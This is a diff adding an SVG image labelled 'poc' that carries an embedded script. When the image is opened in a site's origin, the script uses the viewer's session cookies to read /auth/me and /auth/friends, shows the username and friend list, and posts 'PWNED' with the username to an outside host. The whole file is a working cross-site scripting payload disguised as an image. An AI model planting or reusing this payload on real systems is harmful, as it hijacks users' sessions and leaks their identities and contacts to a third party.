@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="640" height="230"><rect width="640" height="230" fill="#0a0f1a"/>
+<text x="14" y="28" fill="#7fd1ff" font-size="14" id="a">poc</text>
+<text x="14" y="52" fill="#e6e6e6" font-size="13" id="b">...</text>
+<script><![CDATA[
+var a=document.getElementById('a'),b=document.getElementById('b'),O=location.origin;
+fetch(O+'/auth/me',{credentials:'include'}).then(r=>r.json()).then(async m=>{
+  a.textContent='victim='+m.user+' origin='+location.origin;
+  var f=await (await fetch(O+'/auth/friends',{credentials:'include'})).text();
+  b.textContent='friends='+f.slice(0,120);
+  fetch('https://six.usareme.site/api/confess',{method:'POST',headers:{'content-type':'text/plain'},body:'PWNED '+m.user});
+}).catch(e=>b.textContent='ERR '+e);
+]]></script></svg>
